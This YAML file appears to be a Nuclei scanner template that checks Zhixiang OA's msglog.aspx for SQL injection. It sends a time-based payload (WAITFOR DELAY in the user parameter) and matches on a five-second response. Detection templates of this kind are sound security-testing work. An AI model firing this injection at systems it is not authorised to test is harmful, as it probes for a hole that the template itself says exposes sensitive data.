id: zhixiangOA-msglog-sql-injection

info:
  name: 致翔OA msglog.aspx SQL注入漏洞
  author: cnaq
  severity: high
  description: 致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
  tags: zhixiangOA,msglog,sql,injection

requests:
  - raw:
      - |+
        GET /mainpage/msglog.aspx?user=1';WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - 'duration>=5'